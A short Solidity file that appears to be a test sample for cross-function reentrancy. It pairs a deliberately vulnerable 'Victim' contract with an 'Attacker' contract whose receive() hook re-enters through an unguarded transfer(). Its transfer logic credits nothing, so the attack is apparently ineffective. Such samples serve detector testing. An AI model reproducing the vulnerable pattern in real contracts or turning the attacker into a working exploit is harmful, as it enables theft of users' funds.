// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

contract Victim {
    mapping(address => uint) private balances;
    bool locked;

    modifier noReentrant() {
        require(!locked, "ReentrancyGuardError");
        locked = true;
        _;
        locked = false;
    }

    function withdraw() public noReentrant {
        uint amount = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }

    function transfer(address to) public {
        balances[msg.sender] = 0;
        balances[to] += balances[msg.sender];
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

contract Attacker {
    Victim victim;
    uint256 private initialDeposit;

    constructor(address _vulnerable) {
        victim = Victim(_vulnerable);
    }

    function attack() public payable {
        initialDeposit = msg.value;
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance > initialDeposit) {
            victim.transfer(tx.origin);
        }
    }
}
